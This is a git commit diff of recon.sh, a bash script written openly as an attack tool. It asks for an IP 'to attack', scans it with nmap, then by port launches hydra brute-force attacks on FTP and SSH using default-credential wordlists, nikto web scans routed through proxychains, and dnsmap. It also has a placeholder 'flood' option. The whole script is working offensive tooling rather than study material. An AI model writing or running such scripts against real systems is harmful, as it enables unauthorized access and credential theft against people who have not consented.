467d133b64d82e923dda99dbe894dffc0c8ec6c8
shadowwr3ck <44658409+shadowwr3ck@users.noreply.github.com>
2018-11-14 06:24:58 +0400

    Add files via upload
    Latest update:
    Additional programs and functions added

--- recon.sh
+++ recon.sh
@@ -1,48 +1,31 @@
 #!/bin/bash
+FTP_WORDLIST="/usr/share/brutex/wordlists/ftp-default-userpass.txt"
+SSH_WORDLIST="/usr/share/brutex/wordlists/ssh-default-userpass.txt"
+
+#How many threads to use for bruteforce ##
+THREADS="1"
 scantodir_file="/some/dir/scanto.log"
 getip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
 #Attack programs
 # Location of nikto prgram #
-niktodir="/home/$USER/fun/nikto-master/program/"  # Where is the nikto directory???? #
+niktodir="/home/$USER/nikto-master/program/"  # Where is the nikto directory???? #
 nikprog="nikto.pl"  # What have you named nikto ie instead of nikto.pl  it becomes web
-#Whatever you name nikto  always chmod +x newnam.  # 
+#Whatever you name nikto  always chmod +x newnam  # 
 #End nikto stuff
 
 # DNSMAP #
-dnsmapdir="/someplace/somedir/dir/"
-dnsprog="yourfilename"
+dnsmapdir="/usr/bin/dnsmap"
+dnsprog="dnsmap"
 # END DNSMAP 
-#Password Bruteforcer
-
-
-# END attack programs #
-
 # How are you going to flood the bitch #
-#floodprog="/some/dir/where/progis"
-#viassh="$(ssh somename  -c "/usr/bin/perl $floodprog  $ip")"
-
-# lists for password bruteforcing #
+flood='some commands and locations on how you want to flood the user'
+# If you have any MASTER wordlists you wanna use ##
 #rainbowtbl="/somedir/someplace/somefile"
-wordlist="/somedir/someplace/somefile"
-
+#wordlist="/somedir/someplace/somefile"
 
 ### END VARIABLES ###
 
 
-# If nmap doesnt exist in your system Than install it "
-
-## Program installation ##
-if ! which nmap > /dev/null; then
-   echo -e "nmap doesnt exist! Install? (y/n) \c"
-   read REPLY
-	if "$REPLY" = "y"; then
-		sudo apt-get install -y nmap
-	fi	
-fi
-
-
-#Program installation
-#sudo apt install nmap proxychains -y 
 
 # SCRIPT START #
 
@@ -62,36 +45,44 @@ case "$response" in
 esac
 
 
-
 # CHOSE YOUR ATTACK #
 
 # IP attack  #
 
       echo "Enter IP address to attack.  You will be asked for hostname if the attack requires it"
-        read ip 
+        read -r ip 
         nmap -Pn $ip | grep open   # Get the ports from the ip  #
 
 
 # Port attack selection #
 read -r -p " Choose a port to attack " portresponse
   case "$portresponse" in 
-     22)  # If you type 22 Do this attack else do another attack 
-  	echo "Time for an ssh bruteforce"
-		thc-hydra -w $wordlist $ip -p 22
-  ;;
-      flood)
-	echo " Flood the bitch " 
-	echo "${viassh}"
- # placeholder commands
-  ;;
+  
+	    21)
+	echo "Time for an ftp attack.  Cracking against ip"
+        	hydra -C $FTP_WORDLIST $ip ftp -t $THREADS -e ns
+	echo " #### Cracking against hostname #### "
+	read -r -p " Enter hostname without http/s://  " web
+                hydra -C $FTP_WORDLIST $web ftp -t $THREADS -e ns
+;;
+   	   22)  # If you type 22 Do this attack else do another attack 
+   	echo "Time for an ssh bruteforce"
+	        hydra -C $SSH_WORDLIST ssh $ip -t $THREADS -e ns
 
-	  80|443)
-	echo " Enter hostname "
-	read web
+;;
+        flood)
+	echo " Flood the bitch " 
+	echo "${flood}"
+ ;;
+	  80|443|53)
+#	echo " Enter hostname "
+	read -r -p " Enter Hostname :" web
 		 /usr/bin/proxychains /usr/bin/perl $niktodir$nikprog -url $web
 			echo " Initiating dnsmap "
 			dnsmap $web
+			
   ;;
+
 	*)
 		echo " Either no attack for selected port, or something went wrong "
 ;;
